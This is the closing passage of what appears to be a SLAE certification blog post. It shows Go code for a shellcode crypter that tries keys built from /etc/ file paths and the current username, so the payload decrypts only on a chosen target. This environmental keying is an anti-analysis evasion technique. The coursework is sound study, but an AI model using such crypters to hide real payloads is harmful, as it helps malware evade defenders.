</span></span><span class=line><span class=cl>            <span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;[-] Please specify your encrypted shellcode&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>encryptedShellcode</span> <span class=o>:=</span> <span class=nx>opts</span><span class=p>.</span><span class=nx>shellcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>err</span> <span class=p>=</span> <span class=nx>filepath</span><span class=p>.</span><span class=nf>Walk</span><span class=p>(</span><span class=s>&#34;/etc/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>path</span> <span class=kt>string</span><span class=p>,</span> <span class=nx>info</span> <span class=nx>os</span><span class=p>.</span><span class=nx>FileInfo</span><span class=p>,</span> <span class=nx>err</span> <span class=kt>error</span><span class=p>)</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>envKey</span> <span class=o>:=</span> <span class=nx>sha256</span><span class=p>.</span><span class=nf>Sum256</span><span class=p>([]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>path</span> <span class=o>+</span> <span class=nx>currentUser</span><span class=p>.</span><span class=nx>Username</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=nx>plaintext</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nf>decrypt</span><span class=p>(</span><span class=nx>encryptedShellcode</span><span class=p>,</span> <span class=nx>envKey</span><span class=p>[:])</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// Disregard errors
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>return</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;[+] Decrypted shellcode: %s\n&#34;</span><span class=p>,</span> <span class=nx>plaintext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;error walking the path %q: %v\n&#34;</span><span class=p>,</span> <span class=s>&#34;/etc/&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
<script src=/js/particles.conf.js defer></script>
<script src=/js/baffle.min.js async></script>
<script src=/js/main.js defer async></script></body></html>